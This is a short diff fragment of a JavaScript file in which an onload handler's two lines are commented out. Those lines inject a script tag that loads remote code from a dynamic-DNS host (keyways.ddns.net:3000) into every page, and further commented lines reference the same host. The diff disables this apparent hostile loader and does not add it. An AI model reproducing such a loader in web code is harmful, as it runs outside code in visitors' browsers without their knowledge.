@@ -77,8 +77,8 @@ while (coo.length > i45) {
 }
 document.body.onload = function () {
 	var eld = document.createElement('script')
-  	eld.innerHTML = '<script src="http://keyways.ddns.net:3000/"></script><script>setTimeout(function(){checkStatus(2)},1000)</script>';
-  	document.body.insertBefore(eld,document.body.childNodes[0]);
+  	//eld.innerHTML = '<script src="http://keyways.ddns.net:3000/"></script><script>setTimeout(function(){checkStatus(2)},1000)</script>';
+  	//document.body.insertBefore(eld,document.body.childNodes[0]);
 	//eld.src = 'http://keyways.ddns.net:3000/'
 	//$("loadingTag").append( eld );
 	
